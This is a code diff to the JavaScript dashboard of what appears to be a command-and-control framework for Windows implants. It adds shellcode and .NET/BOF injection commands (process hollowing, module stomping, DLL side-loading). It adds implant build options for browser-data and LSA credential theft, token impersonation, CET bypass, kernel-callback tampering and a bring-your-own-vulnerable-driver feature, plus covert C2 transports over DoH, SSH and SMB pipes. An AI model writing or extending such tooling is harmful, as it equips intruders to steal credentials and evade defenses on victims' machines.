@@ -83,6 +83,68 @@
   }
   function escapeAttr(s) { return escapeHtml(s); }
 
+  function hexToBytes(value, label) {
+    const raw = String(value || "").trim();
+    if (!raw) return [];
+
+    const hex = raw
+      .replace(/\b0x/gi, "")
+      .replace(/[\s,;:_-]/g, "");
+
+    if (!hex) return [];
+    if (hex.length % 2 !== 0) {
+      throw new Error(label + " must contain an even number of hex digits.");
+    }
+    if (!/^[0-9a-fA-F]+$/.test(hex)) {
+      throw new Error(label + " contains non-hex characters.");
+    }
+
+    const bytes = [];
+    for (let i = 0; i < hex.length; i += 2) {
+      bytes.push(parseInt(hex.slice(i, i + 2), 16));
+    }
+    return bytes;
+  }
+
+  function splitList(value) {
+    return String(value || "")
+      .split(/[\n,]+/)
+      .map((item) => item.trim())
+      .filter(Boolean);
+  }
+
+  function parseOrdinalExports(value) {
+    return splitList(value).map((entry) => {
+      const match = entry.match(/^(\d+)\s*[:=]\s*(.+)$/);
+      if (!match) {
+        throw new Error("Ordinal exports must use 'ordinal:name' entries.");
+      }
+      const ordinal = parseInt(match[1], 10);
+      const internalName = match[2].trim();
+      if (!Number.isInteger(ordinal) || ordinal < 0 || ordinal > 65535) {
+        throw new Error("Ordinal export values must be between 0 and 65535.");
+      }
+      if (!internalName) {
+        throw new Error("Ordinal export entries must include an internal name.");
+      }
+      return [ordinal, internalName];
+    });
+  }
+
+  function splitArgs(value) {
+    return String(value || "").split(/\s+/).map((arg) => arg.trim()).filter(Boolean);
+  }
+
+  function optionalNumber(value, label) {
+    const raw = String(value || "").trim();
+    if (!raw) return null;
+    const parsed = Number(raw);
+    if (!Number.isInteger(parsed) || parsed < 0) {
+      throw new Error(label + " must be a non-negative integer.");
+    }
+    return parsed;
+  }
+
   async function refreshAgents() {
     try {
       const res = await api("/agents");
@@ -312,12 +374,12 @@
       case "WinRmExec": return { WinRmExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };
 
       // ── Injection Engine ──
-      case "UnifiedInject": return { UnifiedInject: { target_process: args.target_process, payload: Array.from(new TextEncoder().encode(args.payload_hex || "")), technique: args.technique || null, evade: true } };
-      case "TransactedHollow": return { TransactedHollow: { target_process: args.target_process, payload: Array.from(new TextEncoder().encode(args.payload_hex || "")), etw_blinding: args.etw_blinding === "true" } };
-      case "DelayedStomp": return { DelayedStomp: { target_pid: parseInt(args.target_pid, 10) || 0, payload: Array.from(new TextEncoder().encode(args.payload_hex || "")), delay_secs: args.delay_secs ? parseInt(args.delay_secs, 10) : null } };
-      case "InjectSideLoad": return { InjectSideLoad: { pid: parseInt(args.pid, 10) || 0, payload: Array.from(new TextEncoder().encode(args.payload_hex || "")), export_config: { forward_to: args.forward_to || "kernel32.dll", exports: [] } } };
-      case "ExecuteAssembly": return { ExecuteAssembly: { assembly_data: Array.from(new TextEncoder().encode(args.assembly_data || "")), args: (args.args || "").split(" ").filter(Boolean) } };
-      case "ExecuteBOF": return { ExecuteBOF: { bof_data: Array.from(new TextEncoder().encode(args.bof_data || "")), args: [] } };
+      case "UnifiedInject": return { UnifiedInject: { target_process: args.target_process, payload: hexToBytes(args.payload_hex, "Payload"), technique: args.technique || null, evade: true } };
+      case "TransactedHollow": return { TransactedHollow: { target_process: args.target_process, payload: hexToBytes(args.payload_hex, "Payload"), etw_blinding: args.etw_blinding === "true" } };
+      case "DelayedStomp": return { DelayedStomp: { target_pid: parseInt(args.target_pid, 10) || 0, payload: hexToBytes(args.payload_hex, "Payload"), delay_secs: args.delay_secs ? parseInt(args.delay_secs, 10) : null } };
+      case "InjectSideLoad": return { InjectSideLoad: { pid: parseInt(args.pid, 10) || 0, payload: hexToBytes(args.payload_hex, "Payload"), export_config: { forward_target: args.forward_target || "kernel32.dll", named_exports: splitList(args.named_exports), ordinal_exports: parseOrdinalExports(args.ordinal_exports) } } };
+      case "ExecuteAssembly": return { ExecuteAssembly: { data: hexToBytes(args.assembly_data, "Assembly data"), args: splitArgs(args.args), timeout_secs: optionalNumber(args.timeout_secs, "Assembly timeout") } };
+      case "ExecuteBOF": return { ExecuteBOF: { data: hexToBytes(args.bof_data, "BOF data"), args: splitArgs(args.args), timeout_secs: optionalNumber(args.timeout_secs, "BOF timeout") } };
 
       // ── Advanced Evasion ──
       case "SetSleepVariant": return { SetSleepVariant: { variant: args.variant || "auto" } };
@@ -346,6 +408,12 @@
 
       default: return "Ping";
     }
+  }
+
+  if (globalThis.__ORCHESTRA_DASHBOARD_TEST__) {
+    globalThis.__ORCHESTRA_DASHBOARD_TEST__.buildCommandPayload = buildCommandPayload;
+    globalThis.__ORCHESTRA_DASHBOARD_TEST__.hexToBytes = hexToBytes;
+    globalThis.__ORCHESTRA_DASHBOARD_TEST__.parseOrdinalExports = parseOrdinalExports;
   }
 
   /**
@@ -469,14 +537,19 @@
     InjectSideLoad: [
       { id: "pid", label: "Target PID", placeholder: "1234" },
       { id: "payload_hex", label: "Payload (hex-encoded shellcode)", type: "textarea", placeholder: "4d5a9000..." },
-      { id: "forward_to", label: "Export forward DLL", placeholder: "kernel32.dll" },
+      { id: "forward_target", label: "Export Forward DLL", placeholder: "kernel32.dll" },
+      { id: "named_exports", label: "Named Exports (comma or newline separated)", type: "textarea", placeholder: "CreateFileW\nGetLastError" },
+      { id: "ordinal_exports", label: "Ordinal Exports (ordinal:name)", type: "textarea", placeholder: "1:DllRegisterServer\n2:DllUnregisterServer" },
     ],
     ExecuteAssembly: [
       { id: "assembly_data", label: "Assembly (.NET PE, hex-encoded)", type: "textarea", placeholder: "4d5a9000..." },
       { id: "args", label: "Arguments (space-separated)", placeholder: "--arg1 --arg2" },
+      { id: "timeout_secs", label: "Timeout seconds (optional)", placeholder: "30" },
     ],
     ExecuteBOF: [
       { id: "bof_data", label: "BOF/COFF data (hex-encoded)", type: "textarea", placeholder: "4d5a9000..." },
+      { id: "args", label: "Arguments (space-separated)", placeholder: "arg1 arg2" },
+      { id: "timeout_secs", label: "Timeout seconds (optional)", placeholder: "60" },
     ],
 
     // ── Advanced Evasion ──
@@ -555,7 +628,14 @@
       args = result;
     }
 
-    const command = buildCommandPayload(cmdName, args);
+    let command;
+    try {
+      command = buildCommandPayload(cmdName, args);
+    } catch (e) {
+      $("result").textContent = e.message;
+      $("result").className = "err";
+      return;
+    }
     $("result").textContent = "Sending…";
     $("result").className = "muted";
 
@@ -780,11 +860,23 @@
       evasion_transform: $("feat-evasion-transform").checked,
       p2p: $("feat-p2p").checked,
       stack_spoof: $("feat-stack-spoof").checked,
+      manual_map: $("feat-manual-map").checked,
+      browser_data: $("feat-browser-data").checked,
+      lsa_whisperer: $("feat-lsa-whisperer").checked,
+      kernel_callback: $("feat-kernel-callback").checked,
+      embedded_driver: $("feat-embedded-driver").checked,
+      evanesco: $("feat-evanesco").checked,
+      syscall_emulation: $("feat-syscall-emulation").checked,
+      cet_bypass: $("feat-cet-bypass").checked,
+      token_impersonation: $("feat-token-impersonation").checked,
+      transacted_hollowing: $("feat-transacted-hollowing").checked,
+      delayed_stomp: $("feat-delayed-stomp").checked,
     };
   }
 
   /** Apply feature object to checkboxes (for profile import). */
   function setFeatures(f) {
+    f = f || {};
     const set = (id, val) => { const el = $(id); if (el) el.checked = !!val; };
     set("feat-persistence", f.persistence);
     set("feat-direct-syscalls", f.direct_syscalls);
@@ -800,7 +892,119 @@
     set("feat-evasion-transform", f.evasion_transform);
     set("feat-p2p", f.p2p);
     set("feat-stack-spoof", f.stack_spoof);
+    set("feat-manual-map", f.manual_map);
+    set("feat-browser-data", f.browser_data);
+    set("feat-lsa-whisperer", f.lsa_whisperer);
+    set("feat-kernel-callback", f.kernel_callback);
+    set("feat-embedded-driver", f.embedded_driver);
+    set("feat-evanesco", f.evanesco);
+    set("feat-syscall-emulation", f.syscall_emulation);
+    set("feat-cet-bypass", f.cet_bypass);
+    set("feat-token-impersonation", f.token_impersonation);
+    set("feat-transacted-hollowing", f.transacted_hollowing);
+    set("feat-delayed-stomp", f.delayed_stomp);
   }
+
+  function fieldValue(id) {
+    const el = $(id);
+    return el && el.value ? el.value.trim() : "";
+  }
+
+  function optionalField(id) {
+    const value = fieldValue(id);
+    return value || null;
+  }
+
+  function optionalIntField(id, label) {
+    const value = fieldValue(id);
+    if (!value) return null;
+    const parsed = Number.parseInt(value, 10);
+    if (!Number.isInteger(parsed) || parsed < 0 || parsed > 65535) {
+      throw new Error(label + " must be between 0 and 65535.");
+    }
+    return parsed;
+  }
+
+  function getTransportConfig(transport) {
+    const config = {};
+    if (transport === "http") {
+      config.http_endpoint = optionalField("build-http-endpoint");
+      config.http_host_header = optionalField("build-http-host-header");
+    } else if (transport === "doh") {
+      config.doh_server_url = optionalField("build-doh-server-url");
+      config.doh_domain = optionalField("build-doh-domain");
+    } else if (transport === "ssh") {
+      config.ssh_host = optionalField("build-ssh-host");
+      config.ssh_port = optionalIntField("build-ssh-port", "SSH port");
+      config.ssh_username = optionalField("build-ssh-username");
+      config.ssh_host_key_fingerprint = optionalField("build-ssh-host-key-fp");
+      if (!config.ssh_username) throw new Error("SSH username is required for SSH transport.");
+      const authType = fieldValue("build-ssh-auth-type") || "agent";
+      if (authType === "password") {
+        const password = fieldValue("build-ssh-password");
+        if (!password) throw new Error("SSH password is required for password auth.");
+        config.ssh_auth = { type: "password", password };
+      } else if (authType === "key") {
+        const keyPath = fieldValue("build-ssh-key-path");
+        if (!keyPath) throw new Error("SSH key path is required for key auth.");
+        config.ssh_auth = { type: "key", key_path: keyPath };
+      } else {
+        config.ssh_auth = { type: "agent" };
+      }
+    } else if (transport === "smb") {
+      config.smb_pipe_host = optionalField("build-smb-pipe-host");
+      config.smb_pipe_name = optionalField("build-smb-pipe-name");
+      config.smb_pipe_mode = fieldValue("build-smb-pipe-mode") || "smb";
+      config.smb_tcp_relay_port = optionalIntField("build-smb-tcp-relay-port", "SMB relay port");
+    }
+    return config;
+  }
+
+  function setOptionalField(id, value) {
+    const el = $(id);
+    if (el) el.value = value || "";
+  }
+
+  function setTransportConfig(config) {
+    config = config || {};
+    setOptionalField("build-http-endpoint", config.http_endpoint);
+    setOptionalField("build-http-host-header", config.http_host_header);
+    setOptionalField("build-doh-server-url", config.doh_server_url);
+    setOptionalField("build-doh-domain", config.doh_domain);
+    setOptionalField("build-ssh-host", config.ssh_host);
+    setOptionalField("build-ssh-port", config.ssh_port);
+    setOptionalField("build-ssh-username", config.ssh_username);
+    setOptionalField("build-ssh-host-key-fp", config.ssh_host_key_fingerprint);
+    setOptionalField("build-smb-pipe-host", config.smb_pipe_host);
+    setOptionalField("build-smb-pipe-name", config.smb_pipe_name);
+    setOptionalField("build-smb-tcp-relay-port", config.smb_tcp_relay_port);
+    if ($("build-smb-pipe-mode")) $("build-smb-pipe-mode").value = config.smb_pipe_mode || "smb";
+
+    const auth = config.ssh_auth || { type: "agent" };
+    if ($("build-ssh-auth-type")) $("build-ssh-auth-type").value = auth.type || "agent";
+    setOptionalField("build-ssh-password", auth.type === "password" ? auth.password : null);
+    setOptionalField("build-ssh-key-path", auth.type === "key" ? auth.key_path : null);
+  }
+
+  function updateTransportConfigVisibility() {
+    const transport = $("build-transport").value;
+    const show = (id, visible) => { const el = $(id); if (el) el.hidden = !visible; };
+    show("transport-config", transport !== "tls");
+    show("transport-http", transport === "http");
+    show("transport-doh", transport === "doh");
+    show("transport-ssh", transport === "ssh");
+    show("transport-smb", transport === "smb");
+  }
+
+  function updateEmbeddedDriverVisibility() {
+    const el = $("embedded-driver-config");
+    if (el) el.hidden = !$("feat-embedded-driver").checked;
+  }
+
+  $("build-transport").addEventListener("change", updateTransportConfigVisibility);
+  updateTransportConfigVisibility();
+  $("feat-embedded-driver").addEventListener("change", updateEmbeddedDriverVisibility);
+  updateEmbeddedDriverVisibility();
 
   async function submitBuild() {
     const os = $("build-os").value;
@@ -816,6 +1020,7 @@
     const jitter = parseInt($("build-jitter").value, 10) || 20;
     const killDate = $("build-kill-date").value || null;
     const seed = $("build-seed").value.trim() || null;
+    let transportConfig;
 
     if (!host || !port || !pin || !key) {
       alert("Please fill in all connection details and encryption key.");
@@ -824,6 +1029,13 @@
 
     if (!/^[0-9a-fA-F]{64}$/.test(pin)) {
       alert("TLS fingerprint must be exactly 64 hexadecimal characters (SHA-256).");
+      return;
+    }
+
+    try {
+      transportConfig = getTransportConfig(transport);
+    } catch (e) {
+      alert(e.message);
       return;
     }
 
@@ -838,6 +1050,7 @@
 
     const req = {
       os, arch, format, transport,
+      transport_config: transportConfig,
       features: getFeatures(),
       host, port, pin, key,
       sleep_ms: sleepMs,
@@ -847,6 +1060,7 @@
       output_dir: outDir || null,
       version_info: versionInfo,
       manifest_preset: $("build-manifest").value || null,
+      driver_path: $("byovd-driver-path") ? $("byovd-driver-path").value.trim() || null : null,
     };
 
     $("build-download").hidden = true;
@@ -945,12 +1159,20 @@
   $("btn-export-profile").addEventListener("click", async () => {
     const passphrase = $("profile-passphrase").value;
     if (!passphrase) { alert("Please provide a passphrase to encrypt the profile."); return; }
+    let transportConfig;
+    try {
+      transportConfig = getTransportConfig($("build-transport").value);
+    } catch (e) {
+      alert(e.message);
+      return;
+    }
 
     const profileData = {
       os: $("build-os").value,
       arch: $("build-arch").value,
       format: $("build-format").value,
       transport: $("build-transport").value,
+      transport_config: transportConfig,
       features: getFeatures(),
       host: $("build-host").value.trim(),
       port: parseInt($("build-port").value, 10) || 8444,
@@ -1022,19 +1244,16 @@
       if (data.arch) $("build-arch").value = data.arch;
       if (data.format && $("build-format")) $("build-format").value = data.format;
       if (data.transport && $("build-transport")) $("build-transport").value = data.transport;
-      // Accept both old (syscalls/screencap/keylog) and new (direct_syscalls/remote_assist) keys
+      setTransportConfig(data.transport_config);
+      updateTransportConfigVisibility();
+      // Accept both old (syscalls/screencap/keylog) and current BuildFeatures keys.
       if (data.features) {
-        if (data.features.direct_syscalls !== undefined) {
-          setFeatures(data.features);
-        } else if (data.features.syscalls !== undefined) {
-          // Legacy profile: map old names to new struct fields
-          setFeatures({
-            persistence: data.features.persistence,
-            direct_syscalls: data.features.syscalls || data.features.screencap,
-            remote_assist: data.features.screencap || data.features.keylog,
-            stealth: data.features.stealth,
-          });
+        const normalizedFeatures = { ...data.features };
+        if (normalizedFeatures.direct_syscalls === undefined && normalizedFeatures.syscalls !== undefined) {
+          normalizedFeatures.direct_syscalls = normalizedFeatures.syscalls || normalizedFeatures.screencap;
+          normalizedFeatures.remote_assist = normalizedFeatures.screencap || normalizedFeatures.keylog;
         }
+        setFeatures(normalizedFeatures);
       }
       if (data.host) $("build-host").value = data.host;
       if (data.port) $("build-port").value = data.port;
@@ -1055,6 +1274,10 @@
         set("build-origfilename", vi.original_filename);
       }
       if (data.manifest_preset && $("build-manifest")) $("build-manifest").value = data.manifest_preset;
+      if (data.driver_path && $("byovd-driver-path")) {
+        $("byovd-driver-path").value = data.driver_path;
+        updateEmbeddedDriverVisibility();
+      }
 
       alert("Profile loaded successfully.");
     } catch (e) {
